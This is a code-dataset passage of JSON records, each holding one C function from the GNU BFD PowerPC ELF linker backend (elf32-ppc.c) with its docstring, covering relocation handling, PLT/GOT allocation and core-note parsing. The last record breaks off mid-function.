{"docstring": "/* Return the section that should be marked against GC for a given\n   relocation.  */\n", "func_signal": "static asection *\nppc_elf_gc_mark_hook (asection *sec,\n\t\t      struct bfd_link_info *info ATTRIBUTE_UNUSED,\n\t\t      Elf_Internal_Rela *rel,\n\t\t      struct elf_link_hash_entry *h,\n\t\t      Elf_Internal_Sym *sym)", "code": "{\n  if (h != NULL)\n    {\n      switch (ELF32_R_TYPE (rel->r_info))\n\t{\n\tcase R_PPC_GNU_VTINHERIT:\n\tcase R_PPC_GNU_VTENTRY:\n\t  break;\n\n\tdefault:\n\t  switch (h->root.type)\n\t    {\n\t    case bfd_link_hash_defined:\n\t    case bfd_link_hash_defweak:\n\t      return h->root.u.def.section;\n\n\t    case bfd_link_hash_common:\n\t      return h->root.u.c.p->section;\n\n\t    default:\n\t      break;\n\t    }\n\t}\n    }\n  else\n    return bfd_section_from_elf_index (sec->owner, sym->st_shndx);\n\n  return NULL;\n}", "path": "gdb\\src\\bfd\\elf32-ppc.c", "repo_name": "gdbinit/gdb-ng", "stars": 53, "license": "None", "language": "c", "size": 18286}
{"docstring": "/* Allocate space in associated reloc sections for dynamic relocs.  */\n", "func_signal": "static bfd_boolean\nallocate_dynrelocs (struct elf_link_hash_entry *h, void *inf)", "code": "{\n  struct bfd_link_info *info = inf;\n  struct ppc_elf_link_hash_entry *eh;\n  struct ppc_elf_link_hash_table *htab;\n  struct ppc_elf_dyn_relocs *p;\n\n  if (h->root.type == bfd_link_hash_indirect)\n    return TRUE;\n\n  if (h->root.type == bfd_link_hash_warning)\n    /* When warning symbols are created, they **replace** the \"real\"\n       entry in the hash table, thus we never get to see the real\n       symbol in a hash traversal.  So look at it now.  */\n    h = (struct elf_link_hash_entry *) h->root.u.i.link;\n\n  htab = ppc_elf_hash_table (info);\n  if (htab->elf.dynamic_sections_created)\n    {\n      struct plt_entry *ent;\n      bfd_boolean doneone = FALSE;\n      bfd_vma plt_offset = 0, glink_offset = 0;\n\n      for (ent = h->plt.plist; ent != NULL; ent = ent->next)\n\tif (ent->plt.refcount > 0)\n\t  {\n\t    /* Make sure this symbol is output as a dynamic symbol.  */\n\t    if (h->dynindx == -1\n\t\t&& !h->forced_local)\n\t      {\n\t\tif (! bfd_elf_link_record_dynamic_symbol (info, h))\n\t\t  return FALSE;\n\t      }\n\n\t    if (info->shared\n\t\t|| WILL_CALL_FINISH_DYNAMIC_SYMBOL (1, 0, h))\n\t      {\n\t\tasection *s = htab->plt;\n\n\t\tif (!(htab->old_plt || htab->is_vxworks))\n\t\t  {\n\t\t    if (!doneone)\n\t\t      {\n\t\t\tplt_offset = s->size;\n\t\t\ts->size += 4;\n\t\t      }\n\t\t    ent->plt.offset = plt_offset;\n\n\t\t    s = htab->glink;\n\t\t    if (!doneone || info->shared || info->pie)\n\t\t      {\n\t\t\tglink_offset = s->size;\n\t\t\ts->size += GLINK_ENTRY_SIZE;\n\t\t      }\n\t\t    if (!doneone\n\t\t\t&& !info->shared\n\t\t\t&& !h->def_regular)\n\t\t      {\n\t\t\th->root.u.def.section = s;\n\t\t\th->root.u.def.value = glink_offset;\n\t\t      }\n\t\t    ent->glink_offset = glink_offset;\n\t\t  }\n\t\telse\n\t\t  {\n\t\t    if (!doneone)\n\t\t      {\n\t\t\t/* If this is the first .plt entry, make room\n\t\t\t   for the special first entry.  */\n\t\t\tif (s->size == 0)\n\t\t\t  s->size += htab->plt_initial_entry_size;\n\n\t\t\t/* The PowerPC PLT is actually composed of two\n\t\t\t   parts, the first part is 2 words (for a load\n\t\t\t   and a jump), and then there is a remaining\n\t\t\t   word available at the end.  */\n\t\t\tplt_offset = (htab->plt_initial_entry_size\n\t\t\t\t      + (htab->plt_slot_size\n\t\t\t\t\t * ((s->size\n\t\t\t\t\t     - htab->plt_initial_entry_size)\n\t\t\t\t\t    / htab->plt_entry_size)));\n\n\t\t\t/* If this symbol is not defined in a regular\n\t\t\t   file, and we are not generating a shared\n\t\t\t   library, then set the symbol to this location\n\t\t\t   in the .plt.  This is required to make\n\t\t\t   function pointers compare as equal between\n\t\t\t   the normal executable and the shared library.  */\n\t\t\tif (! info->shared\n\t\t\t    && !h->def_regular)\n\t\t\t  {\n\t\t\t    h->root.u.def.section = s;\n\t\t\t    h->root.u.def.value = plt_offset;\n\t\t\t  }\n\n\t\t\t/* Make room for this entry.  */\n\t\t\ts->size += htab->plt_entry_size;\n\t\t\t/* After the 8192nd entry, room for two entries\n\t\t\t   is allocated.  */\n\t\t\tif (!htab->is_vxworks\n\t\t\t    && (s->size - htab->plt_initial_entry_size)\n\t\t\t\t/ htab->plt_entry_size\n\t\t\t       > PLT_NUM_SINGLE_ENTRIES)\n\t\t\t  s->size += htab->plt_entry_size;\n\t\t      }\n\t\t    ent->plt.offset = plt_offset;\n\t\t  }\n\n\t\t/* We also need to make an entry in the .rela.plt section.  */\n\t\tif (!doneone)\n\t\t  {\n\t\t    htab->relplt->size += sizeof (Elf32_External_Rela);\n\n\t\t    if (htab->is_vxworks)\n\t\t      {\n\t\t\t/* Allocate space for the unloaded relocations.  */\n\t\t\tif (!info->shared)\n\t\t\t  {\n\t\t\t    if (ent->plt.offset\n\t\t\t\t== (bfd_vma) htab->plt_initial_entry_size)\n\t\t\t      {\n\t\t\t\thtab->srelplt2->size\n\t\t\t\t  += sizeof (Elf32_External_Rela)\n\t\t\t\t      * VXWORKS_PLTRESOLVE_RELOCS;\n\t\t\t      }\n\n\t\t\t    htab->srelplt2->size\n\t\t\t      += sizeof (Elf32_External_Rela)\n\t\t\t\t  * VXWORKS_PLT_NON_JMP_SLOT_RELOCS;\n\t\t\t  }\n\n\t\t\t/* Every PLT entry has an associated GOT entry in\n\t\t\t   .got.plt.  */\n\t\t\thtab->sgotplt->size += 4;\n\t\t      }\n\t\t    doneone = TRUE;\n\t\t  }\n\t      }\n\t    else\n\t      ent->plt.offset = (bfd_vma) -1;\n\n\t    if (!doneone)\n\t      {\n\t\th->plt.plist = NULL;\n\t\th->needs_plt = 0;\n\t      }\n\t  }\n    }\n  else\n    {\n      h->plt.plist = NULL;\n      h->needs_plt = 0;\n    }\n\n  eh = (struct ppc_elf_link_hash_entry *) h;\n  if (eh->elf.got.refcount > 0)\n    {\n      /* Make sure this symbol is output as a dynamic symbol.  */\n      if (eh->elf.dynindx == -1\n\t  && !eh->elf.forced_local)\n\t{\n\t  if (!bfd_elf_link_record_dynamic_symbol (info, &eh->elf))\n\t    return FALSE;\n\t}\n\n      if (eh->tls_mask == (TLS_TLS | TLS_LD)\n\t  && !eh->elf.def_dynamic)\n\t/* If just an LD reloc, we'll just use htab->tlsld_got.offset.  */\n\teh->elf.got.offset = (bfd_vma) -1;\n      else\n\t{\n\t  bfd_boolean dyn;\n\t  unsigned int need = 0;\n\t  if ((eh->tls_mask & TLS_TLS) != 0)\n\t    {\n\t      if ((eh->tls_mask & TLS_LD) != 0)\n\t\tneed += 8;\n\t      if ((eh->tls_mask & TLS_GD) != 0)\n\t\tneed += 8;\n\t      if ((eh->tls_mask & (TLS_TPREL | TLS_TPRELGD)) != 0)\n\t\tneed += 4;\n\t      if ((eh->tls_mask & TLS_DTPREL) != 0)\n\t\tneed += 4;\n\t    }\n\t  else\n\t    need += 4;\n\t  eh->elf.got.offset = allocate_got (htab, need);\n\t  dyn = htab->elf.dynamic_sections_created;\n\t  if ((info->shared\n\t       || WILL_CALL_FINISH_DYNAMIC_SYMBOL (dyn, 0, &eh->elf))\n\t      && (ELF_ST_VISIBILITY (eh->elf.other) == STV_DEFAULT\n\t\t  || eh->elf.root.type != bfd_link_hash_undefweak))\n\t    {\n\t      /* All the entries we allocated need relocs.\n\t\t Except LD only needs one.  */\n\t      if ((eh->tls_mask & TLS_LD) != 0)\n\t\tneed -= 4;\n\t      htab->relgot->size += need * (sizeof (Elf32_External_Rela) / 4);\n\t    }\n\t}\n    }\n  else\n    eh->elf.got.offset = (bfd_vma) -1;\n\n  if (eh->dyn_relocs == NULL)\n    return TRUE;\n\n  /* In the shared -Bsymbolic case, discard space allocated for\n     dynamic pc-relative relocs against symbols which turn out to be\n     defined in regular objects.  For the normal shared case, discard\n     space for relocs that have become local due to symbol visibility\n     changes.  */\n\n  if (info->shared)\n    {\n      /* Relocs that use pc_count are those that appear on a call insn,\n\t or certain REL relocs (see MUST_BE_DYN_RELOC) that can be\n\t generated via assembly.  We want calls to protected symbols to\n\t resolve directly to the function rather than going via the plt.\n\t If people want function pointer comparisons to work as expected\n\t then they should avoid writing weird assembly.  */\n      if (SYMBOL_CALLS_LOCAL (info, h))\n\t{\n\t  struct ppc_elf_dyn_relocs **pp;\n\n\t  for (pp = &eh->dyn_relocs; (p = *pp) != NULL; )\n\t    {\n\t      p->count -= p->pc_count;\n\t      p->pc_count = 0;\n\t      if (p->count == 0)\n\t\t*pp = p->next;\n\t      else\n\t\tpp = &p->next;\n\t    }\n\t}\n\n      /* Also discard relocs on undefined weak syms with non-default\n\t visibility.  */\n      if (ELF_ST_VISIBILITY (h->other) != STV_DEFAULT\n\t  && h->root.type == bfd_link_hash_undefweak)\n\teh->dyn_relocs = NULL;\n\n      /* Make sure undefined weak symbols are output as a dynamic symbol\n\t in PIEs.  */\n      if (info->pie\n\t  && eh->dyn_relocs != NULL\n\t  && h->dynindx == -1\n\t  && h->root.type == bfd_link_hash_undefweak\n\t  && !h->forced_local)\n\t{\n\t  if (! bfd_elf_link_record_dynamic_symbol (info, h))\n\t    return FALSE;\n\t}\n    }\n  else if (ELIMINATE_COPY_RELOCS)\n    {\n      /* For the non-shared case, discard space for relocs against\n\t symbols which turn out to need copy relocs or are not\n\t dynamic.  */\n\n      if (!h->non_got_ref\n\t  && h->def_dynamic\n\t  && !h->def_regular)\n\t{\n\t  /* Make sure this symbol is output as a dynamic symbol.\n\t     Undefined weak syms won't yet be marked as dynamic.  */\n\t  if (h->dynindx == -1\n\t      && !h->forced_local)\n\t    {\n\t      if (! bfd_elf_link_record_dynamic_symbol (info, h))\n\t\treturn FALSE;\n\t    }\n\n\t  /* If that succeeded, we know we'll be keeping all the\n\t     relocs.  */\n\t  if (h->dynindx != -1)\n\t    goto keep;\n\t}\n\n      eh->dyn_relocs = NULL;\n\n    keep: ;\n    }\n\n  /* Finally, allocate space.  */\n  for (p = eh->dyn_relocs; p != NULL; p = p->next)\n    {\n      asection *sreloc = elf_section_data (p->sec)->sreloc;\n      sreloc->size += p->count * sizeof (Elf32_External_Rela);\n    }\n\n  return TRUE;\n}", "path": "gdb\\src\\bfd\\elf32-ppc.c", "repo_name": "gdbinit/gdb-ng", "stars": 53, "license": "None", "language": "c", "size": 18286}
{"docstring": "/* Support for core dump NOTE sections.  */\n", "func_signal": "static bfd_boolean\nppc_elf_grok_prstatus (bfd *abfd, Elf_Internal_Note *note)", "code": "{\n  int offset;\n  unsigned int size;\n\n  switch (note->descsz)\n    {\n    default:\n      return FALSE;\n\n    case 268:\t\t/* Linux/PPC.  */\n      /* pr_cursig */\n      elf_tdata (abfd)->core_signal = bfd_get_16 (abfd, note->descdata + 12);\n\n      /* pr_pid */\n      elf_tdata (abfd)->core_pid = bfd_get_32 (abfd, note->descdata + 24);\n\n      /* pr_reg */\n      offset = 72;\n      size = 192;\n\n      break;\n    }\n\n  /* Make a \".reg/999\" section.  */\n  return _bfd_elfcore_make_pseudosection (abfd, \".reg\",\n\t\t\t\t\t  size, note->descpos + offset);\n}", "path": "gdb\\src\\bfd\\elf32-ppc.c", "repo_name": "gdbinit/gdb-ng", "stars": 53, "license": "None", "language": "c", "size": 18286}
{"docstring": "/* Set the howto pointer for a PowerPC ELF reloc.  */\n", "func_signal": "static void\nppc_elf_info_to_howto (bfd *abfd ATTRIBUTE_UNUSED,\n\t\t       arelent *cache_ptr,\n\t\t       Elf_Internal_Rela *dst)", "code": "{\n  /* Initialize howto table if not already done.  */\n  if (!ppc_elf_howto_table[R_PPC_ADDR32])\n    ppc_elf_howto_init ();\n\n  BFD_ASSERT (ELF32_R_TYPE (dst->r_info) < (unsigned int) R_PPC_max);\n  cache_ptr->howto = ppc_elf_howto_table[ELF32_R_TYPE (dst->r_info)];\n}", "path": "gdb\\src\\bfd\\elf32-ppc.c", "repo_name": "gdbinit/gdb-ng", "stars": 53, "license": "None", "language": "c", "size": 18286}
{"docstring": "/* We have to create .dynsbss and .rela.sbss here so that they get mapped\n   to output sections (just like _bfd_elf_create_dynamic_sections has\n   to create .dynbss and .rela.bss).  */\n", "func_signal": "static bfd_boolean\nppc_elf_create_dynamic_sections (bfd *abfd, struct bfd_link_info *info)", "code": "{\n  struct ppc_elf_link_hash_table *htab;\n  asection *s;\n  flagword flags;\n\n  htab = ppc_elf_hash_table (info);\n\n  if (htab->got == NULL\n      && !ppc_elf_create_got (abfd, info))\n    return FALSE;\n\n  if (!_bfd_elf_create_dynamic_sections (abfd, info))\n    return FALSE;\n\n  flags = (SEC_ALLOC | SEC_LOAD | SEC_READONLY | SEC_HAS_CONTENTS\n\t   | SEC_IN_MEMORY | SEC_LINKER_CREATED);\n\n  s = bfd_make_section_anyway_with_flags (abfd, \".glink\", flags | SEC_CODE);\n  htab->glink = s;\n  if (s == NULL\n      || !bfd_set_section_alignment (abfd, s, 4))\n    return FALSE;\n\n  htab->dynbss = bfd_get_section_by_name (abfd, \".dynbss\");\n  s = bfd_make_section_with_flags (abfd, \".dynsbss\",\n\t\t\t\t   SEC_ALLOC | SEC_LINKER_CREATED);\n  htab->dynsbss = s;\n  if (s == NULL)\n    return FALSE;\n\n  if (! info->shared)\n    {\n      htab->relbss = bfd_get_section_by_name (abfd, \".rela.bss\");\n      s = bfd_make_section_with_flags (abfd, \".rela.sbss\", flags);\n      htab->relsbss = s;\n      if (s == NULL\n\t  || ! bfd_set_section_alignment (abfd, s, 2))\n\treturn FALSE;\n    }\n\n  /* Create the section for VxWorks static plt relocations.  */\n  if (htab->is_vxworks && !info->shared)\n    {\n      s = bfd_make_section (abfd, \".rela.plt.unloaded\");\n      flags = (SEC_HAS_CONTENTS | SEC_IN_MEMORY | SEC_READONLY\n\t       | SEC_LINKER_CREATED);\n      if (s == NULL\n\t  || ! bfd_set_section_flags (abfd, s, flags)\n\t  || ! bfd_set_section_alignment (abfd, s,\n\t\t  get_elf_backend_data (abfd)->s->log_file_align))\n\treturn FALSE;\n      htab->srelplt2 = s;\n    }\n\n  htab->relplt = bfd_get_section_by_name (abfd, \".rela.plt\");\n  htab->plt = s = bfd_get_section_by_name (abfd, \".plt\");\n  if (s == NULL)\n    abort ();\n\n  flags = SEC_ALLOC | SEC_CODE | SEC_LINKER_CREATED;\n  return bfd_set_section_flags (abfd, s, flags);\n}", "path": "gdb\\src\\bfd\\elf32-ppc.c", "repo_name": "gdbinit/gdb-ng", "stars": 53, "license": "None", "language": "c", "size": 18286}
{"docstring": "/* Scan the input BFDs and create a linked list of\n   the APUinfo values that will need to be emitted.  */\n", "func_signal": "static void\nppc_elf_begin_write_processing (bfd *abfd, struct bfd_link_info *link_info)", "code": "{\n  bfd *ibfd;\n  asection *asec;\n  char *buffer;\n  unsigned num_input_sections;\n  bfd_size_type\toutput_section_size;\n  unsigned i;\n  unsigned num_entries;\n  unsigned long\toffset;\n  unsigned long length;\n  const char *error_message = NULL;\n\n  if (link_info == NULL)\n    return;\n\n  /* Scan the input bfds, looking for apuinfo sections.  */\n  num_input_sections = 0;\n  output_section_size = 0;\n\n  for (ibfd = link_info->input_bfds; ibfd; ibfd = ibfd->link_next)\n    {\n      asec = bfd_get_section_by_name (ibfd, APUINFO_SECTION_NAME);\n      if (asec)\n\t{\n\t  ++ num_input_sections;\n\t  output_section_size += asec->size;\n\t}\n    }\n\n  /* We need at least one input sections\n     in order to make merging worthwhile.  */\n  if (num_input_sections < 1)\n    return;\n\n  /* Just make sure that the output section exists as well.  */\n  asec = bfd_get_section_by_name (abfd, APUINFO_SECTION_NAME);\n  if (asec == NULL)\n    return;\n\n  /* Allocate a buffer for the contents of the input sections.  */\n  buffer = bfd_malloc (output_section_size);\n  if (buffer == NULL)\n    return;\n\n  offset = 0;\n  apuinfo_list_init ();\n\n  /* Read in the input sections contents.  */\n  for (ibfd = link_info->input_bfds; ibfd; ibfd = ibfd->link_next)\n    {\n      unsigned long datum;\n      char *ptr;\n\n      asec = bfd_get_section_by_name (ibfd, APUINFO_SECTION_NAME);\n      if (asec == NULL)\n\tcontinue;\n\n      length = asec->size;\n      if (length < 24)\n\t{\n\t  error_message = _(\"corrupt or empty %s section in %B\");\n\t  goto fail;\n\t}\n\n      if (bfd_seek (ibfd, asec->filepos, SEEK_SET) != 0\n\t  || (bfd_bread (buffer + offset, length, ibfd) != length))\n\t{\n\t  error_message = _(\"unable to read in %s section from %B\");\n\t  goto fail;\n\t}\n\n      /* Process the contents of the section.  */\n      ptr = buffer + offset;\n      error_message = _(\"corrupt %s section in %B\");\n\n      /* Verify the contents of the header.  Note - we have to\n\t extract the values this way in order to allow for a\n\t host whose endian-ness is different from the target.  */\n      datum = bfd_get_32 (ibfd, ptr);\n      if (datum != sizeof APUINFO_LABEL)\n\tgoto fail;\n\n      datum = bfd_get_32 (ibfd, ptr + 8);\n      if (datum != 0x2)\n\tgoto fail;\n\n      if (strcmp (ptr + 12, APUINFO_LABEL) != 0)\n\tgoto fail;\n\n      /* Get the number of bytes used for apuinfo entries.  */\n      datum = bfd_get_32 (ibfd, ptr + 4);\n      if (datum + 20 != length)\n\tgoto fail;\n\n      /* Make sure that we do not run off the end of the section.  */\n      if (offset + length > output_section_size)\n\tgoto fail;\n\n      /* Scan the apuinfo section, building a list of apuinfo numbers.  */\n      for (i = 0; i < datum; i += 4)\n\tapuinfo_list_add (bfd_get_32 (ibfd, ptr + 20 + i));\n\n      /* Update the offset.  */\n      offset += length;\n    }\n\n  error_message = NULL;\n\n  /* Compute the size of the output section.  */\n  num_entries = apuinfo_list_length ();\n  output_section_size = 20 + num_entries * 4;\n\n  asec = bfd_get_section_by_name (abfd, APUINFO_SECTION_NAME);\n\n  if (! bfd_set_section_size (abfd, asec, output_section_size))\n    ibfd = abfd,\n      error_message = _(\"warning: unable to set size of %s section in %B\");\n\n fail:\n  free (buffer);\n\n  if (error_message)\n    (*_bfd_error_handler) (error_message, ibfd, APUINFO_SECTION_NAME);\n}", "path": "gdb\\src\\bfd\\elf32-ppc.c", "repo_name": "gdbinit/gdb-ng", "stars": 53, "license": "None", "language": "c", "size": 18286}
{"docstring": "/* VxWorks uses the elf default section flags for .plt.  */\n", "func_signal": "static const struct bfd_elf_special_section *\nppc_elf_vxworks_get_sec_type_attr (bfd *abfd ATTRIBUTE_UNUSED, asection *sec)", "code": "{\n  if (sec->name == NULL)\n    return NULL;\n\n  if (strcmp (sec->name, \".plt\") == 0)\n    return _bfd_elf_get_sec_type_attr (abfd, sec);\n\n  return ppc_elf_get_sec_type_attr (abfd, sec);\n}", "path": "gdb\\src\\bfd\\elf32-ppc.c", "repo_name": "gdbinit/gdb-ng", "stars": 53, "license": "None", "language": "c", "size": 18286}
{"docstring": "/* Function to set whether a module needs the -mrelocatable bit set.  */\n", "func_signal": "static bfd_boolean\nppc_elf_set_private_flags (bfd *abfd, flagword flags)", "code": "{\n  BFD_ASSERT (!elf_flags_init (abfd)\n\t      || elf_elfheader (abfd)->e_flags == flags);\n\n  elf_elfheader (abfd)->e_flags = flags;\n  elf_flags_init (abfd) = TRUE;\n  return TRUE;\n}", "path": "gdb\\src\\bfd\\elf32-ppc.c", "repo_name": "gdbinit/gdb-ng", "stars": 53, "license": "None", "language": "c", "size": 18286}
{"docstring": "/* Look through the relocs for a section during the first phase, and\n   allocate space in the global offset table or procedure linkage\n   table.  */\n", "func_signal": "static bfd_boolean\nppc_elf_check_relocs (bfd *abfd,\n\t\t      struct bfd_link_info *info,\n\t\t      asection *sec,\n\t\t      const Elf_Internal_Rela *relocs)", "code": "{\n  struct ppc_elf_link_hash_table *htab;\n  Elf_Internal_Shdr *symtab_hdr;\n  struct elf_link_hash_entry **sym_hashes;\n  const Elf_Internal_Rela *rel;\n  const Elf_Internal_Rela *rel_end;\n  asection *got2, *sreloc;\n\n  if (info->relocatable)\n    return TRUE;\n\n  /* Don't do anything special with non-loaded, non-alloced sections.\n     In particular, any relocs in such sections should not affect GOT\n     and PLT reference counting (ie. we don't allow them to create GOT\n     or PLT entries), there's no possibility or desire to optimize TLS\n     relocs, and there's not much point in propagating relocs to shared\n     libs that the dynamic linker won't relocate.  */\n  if ((sec->flags & SEC_ALLOC) == 0)\n    return TRUE;\n\n#ifdef DEBUG\n  _bfd_error_handler (\"ppc_elf_check_relocs called for section %A in %B\",\n\t\t      sec, abfd);\n#endif\n\n  /* Initialize howto table if not already done.  */\n  if (!ppc_elf_howto_table[R_PPC_ADDR32])\n    ppc_elf_howto_init ();\n\n  htab = ppc_elf_hash_table (info);\n  symtab_hdr = &elf_tdata (abfd)->symtab_hdr;\n  sym_hashes = elf_sym_hashes (abfd);\n  got2 = bfd_get_section_by_name (abfd, \".got2\");\n  sreloc = NULL;\n\n  rel_end = relocs + sec->reloc_count;\n  for (rel = relocs; rel < rel_end; rel++)\n    {\n      unsigned long r_symndx;\n      enum elf_ppc_reloc_type r_type;\n      struct elf_link_hash_entry *h;\n      int tls_type = 0;\n\n      r_symndx = ELF32_R_SYM (rel->r_info);\n      if (r_symndx < symtab_hdr->sh_info)\n\th = NULL;\n      else\n\t{\n\t  h = sym_hashes[r_symndx - symtab_hdr->sh_info];\n\t  while (h->root.type == bfd_link_hash_indirect\n\t\t || h->root.type == bfd_link_hash_warning)\n\t    h = (struct elf_link_hash_entry *) h->root.u.i.link;\n\t}\n\n      /* If a relocation refers to _GLOBAL_OFFSET_TABLE_, create the .got.\n\t This shows up in particular in an R_PPC_ADDR32 in the eabi\n\t startup code.  */\n      if (h != NULL\n\t  && htab->got == NULL\n\t  && strcmp (h->root.root.string, \"_GLOBAL_OFFSET_TABLE_\") == 0)\n\t{\n\t  if (htab->elf.dynobj == NULL)\n\t    htab->elf.dynobj = abfd;\n\t  if (!ppc_elf_create_got (htab->elf.dynobj, info))\n\t    return FALSE;\n\t  BFD_ASSERT (h == htab->elf.hgot);\n\t}\n\n      r_type = ELF32_R_TYPE (rel->r_info);\n      switch (r_type)\n\t{\n\tcase R_PPC_GOT_TLSLD16:\n\tcase R_PPC_GOT_TLSLD16_LO:\n\tcase R_PPC_GOT_TLSLD16_HI:\n\tcase R_PPC_GOT_TLSLD16_HA:\n\t  htab->tlsld_got.refcount += 1;\n\t  tls_type = TLS_TLS | TLS_LD;\n\t  goto dogottls;\n\n\tcase R_PPC_GOT_TLSGD16:\n\tcase R_PPC_GOT_TLSGD16_LO:\n\tcase R_PPC_GOT_TLSGD16_HI:\n\tcase R_PPC_GOT_TLSGD16_HA:\n\t  tls_type = TLS_TLS | TLS_GD;\n\t  goto dogottls;\n\n\tcase R_PPC_GOT_TPREL16:\n\tcase R_PPC_GOT_TPREL16_LO:\n\tcase R_PPC_GOT_TPREL16_HI:\n\tcase R_PPC_GOT_TPREL16_HA:\n\t  if (info->shared)\n\t    info->flags |= DF_STATIC_TLS;\n\t  tls_type = TLS_TLS | TLS_TPREL;\n\t  goto dogottls;\n\n\tcase R_PPC_GOT_DTPREL16:\n\tcase R_PPC_GOT_DTPREL16_LO:\n\tcase R_PPC_GOT_DTPREL16_HI:\n\tcase R_PPC_GOT_DTPREL16_HA:\n\t  tls_type = TLS_TLS | TLS_DTPREL;\n\tdogottls:\n\t  sec->has_tls_reloc = 1;\n\t  /* Fall thru */\n\n\t  /* GOT16 relocations */\n\tcase R_PPC_GOT16:\n\tcase R_PPC_GOT16_LO:\n\tcase R_PPC_GOT16_HI:\n\tcase R_PPC_GOT16_HA:\n\t  /* This symbol requires a global offset table entry.  */\n\t  if (htab->got == NULL)\n\t    {\n\t      if (htab->elf.dynobj == NULL)\n\t\thtab->elf.dynobj = abfd;\n\t      if (!ppc_elf_create_got (htab->elf.dynobj, info))\n\t\treturn FALSE;\n\t    }\n\t  if (h != NULL)\n\t    {\n\t      h->got.refcount += 1;\n\t      ppc_elf_hash_entry (h)->tls_mask |= tls_type;\n\t    }\n\t  else\n\t    /* This is a global offset table entry for a local symbol.  */\n\t    if (!update_local_sym_info (abfd, symtab_hdr, r_symndx, tls_type))\n\t      return FALSE;\n\t  break;\n\n\t  /* Indirect .sdata relocation.  */\n\tcase R_PPC_EMB_SDAI16:\n\t  if (info->shared)\n\t    {\n\t      bad_shared_reloc (abfd, r_type);\n\t      return FALSE;\n\t    }\n\t  if (htab->sdata[0].section == NULL\n\t      && !ppc_elf_create_linker_section (abfd, info, 0,\n\t\t\t\t\t\t &htab->sdata[0]))\n\t    return FALSE;\n\t  if (!elf_create_pointer_linker_section (abfd, &htab->sdata[0],\n\t\t\t\t\t\t  h, rel))\n\t    return FALSE;\n\t  if (h != NULL)\n\t    {\n\t      ppc_elf_hash_entry (h)->has_sda_refs = TRUE;\n\t      h->non_got_ref = TRUE;\n\t    }\n\t  break;\n\n\t  /* Indirect .sdata2 relocation.  */\n\tcase R_PPC_EMB_SDA2I16:\n\t  if (info->shared)\n\t    {\n\t      bad_shared_reloc (abfd, r_type);\n\t      return FALSE;\n\t    }\n\t  if (htab->sdata[1].section == NULL\n\t      && !ppc_elf_create_linker_section (abfd, info, SEC_READONLY,\n\t\t\t\t\t\t &htab->sdata[1]))\n\t    return FALSE;\n\t  if (!elf_create_pointer_linker_section (abfd, &htab->sdata[1],\n\t\t\t\t\t\t  h, rel))\n\t    return FALSE;\n\t  if (h != NULL)\n\t    {\n\t      ppc_elf_hash_entry (h)->has_sda_refs = TRUE;\n\t      h->non_got_ref = TRUE;\n\t    }\n\t  break;\n\n\tcase R_PPC_SDAREL16:\n\t  if (info->shared)\n\t    {\n\t      bad_shared_reloc (abfd, r_type);\n\t      return FALSE;\n\t    }\n\t  if (htab->sdata[0].sym == NULL\n\t      && !create_sdata_sym (htab, &htab->sdata[0]))\n\t    return FALSE;\n\t  if (h != NULL)\n\t    {\n\t      ppc_elf_hash_entry (h)->has_sda_refs = TRUE;\n\t      h->non_got_ref = TRUE;\n\t    }\n\t  break;\n\n\tcase R_PPC_EMB_SDA2REL:\n\t  if (info->shared)\n\t    {\n\t      bad_shared_reloc (abfd, r_type);\n\t      return FALSE;\n\t    }\n\t  if (htab->sdata[1].sym == NULL\n\t      && !create_sdata_sym (htab, &htab->sdata[1]))\n\t    return FALSE;\n\t  if (h != NULL)\n\t    {\n\t      ppc_elf_hash_entry (h)->has_sda_refs = TRUE;\n\t      h->non_got_ref = TRUE;\n\t    }\n\t  break;\n\n\tcase R_PPC_EMB_SDA21:\n\tcase R_PPC_EMB_RELSDA:\n\t  if (info->shared)\n\t    {\n\t      bad_shared_reloc (abfd, r_type);\n\t      return FALSE;\n\t    }\n\t  if (htab->sdata[0].sym == NULL\n\t      && !create_sdata_sym (htab, &htab->sdata[0]))\n\t    return FALSE;\n\t  if (htab->sdata[1].sym == NULL\n\t      && !create_sdata_sym (htab, &htab->sdata[1]))\n\t    return FALSE;\n\t  if (h != NULL)\n\t    {\n\t      ppc_elf_hash_entry (h)->has_sda_refs = TRUE;\n\t      h->non_got_ref = TRUE;\n\t    }\n\t  break;\n\n\tcase R_PPC_EMB_NADDR32:\n\tcase R_PPC_EMB_NADDR16:\n\tcase R_PPC_EMB_NADDR16_LO:\n\tcase R_PPC_EMB_NADDR16_HI:\n\tcase R_PPC_EMB_NADDR16_HA:\n\t  if (info->shared)\n\t    {\n\t      bad_shared_reloc (abfd, r_type);\n\t      return FALSE;\n\t    }\n\t  if (h != NULL)\n\t    h->non_got_ref = TRUE;\n\t  break;\n\n\tcase R_PPC_PLT32:\n\tcase R_PPC_PLTREL24:\n\tcase R_PPC_PLTREL32:\n\tcase R_PPC_PLT16_LO:\n\tcase R_PPC_PLT16_HI:\n\tcase R_PPC_PLT16_HA:\n#ifdef DEBUG\n\t  fprintf (stderr, \"Reloc requires a PLT entry\\n\");\n#endif\n\t  /* This symbol requires a procedure linkage table entry.  We\n\t     actually build the entry in finish_dynamic_symbol,\n\t     because this might be a case of linking PIC code without\n\t     linking in any dynamic objects, in which case we don't\n\t     need to generate a procedure linkage table after all.  */\n\n\t  if (h == NULL)\n\t    {\n\t      /* It does not make sense to have a procedure linkage\n\t\t table entry for a local symbol.  */\n\t      (*_bfd_error_handler) (_(\"%B(%A+0x%lx): %s reloc against \"\n\t\t\t\t       \"local symbol\"),\n\t\t\t\t     abfd,\n\t\t\t\t     sec,\n\t\t\t\t     (long) rel->r_offset,\n\t\t\t\t     ppc_elf_howto_table[r_type]->name);\n\t      bfd_set_error (bfd_error_bad_value);\n\t      return FALSE;\n\t    }\n\t  else\n\t    {\n\t      bfd_vma addend = r_type == R_PPC_PLTREL24 ? rel->r_addend : 0;\n\n\t      h->needs_plt = 1;\n\t      if (!update_plt_info (abfd, h, got2, addend))\n\t\treturn FALSE;\n\t    }\n\t  break;\n\n\t  /* The following relocations don't need to propagate the\n\t     relocation if linking a shared object since they are\n\t     section relative.  */\n\tcase R_PPC_SECTOFF:\n\tcase R_PPC_SECTOFF_LO:\n\tcase R_PPC_SECTOFF_HI:\n\tcase R_PPC_SECTOFF_HA:\n\tcase R_PPC_DTPREL16:\n\tcase R_PPC_DTPREL16_LO:\n\tcase R_PPC_DTPREL16_HI:\n\tcase R_PPC_DTPREL16_HA:\n\tcase R_PPC_TOC16:\n\t  break;\n\n\tcase R_PPC_REL16:\n\tcase R_PPC_REL16_LO:\n\tcase R_PPC_REL16_HI:\n\tcase R_PPC_REL16_HA:\n\t  htab->new_plt = 1;\n\t  break;\n\n\t  /* These are just markers.  */\n\tcase R_PPC_TLS:\n\tcase R_PPC_EMB_MRKREF:\n\tcase 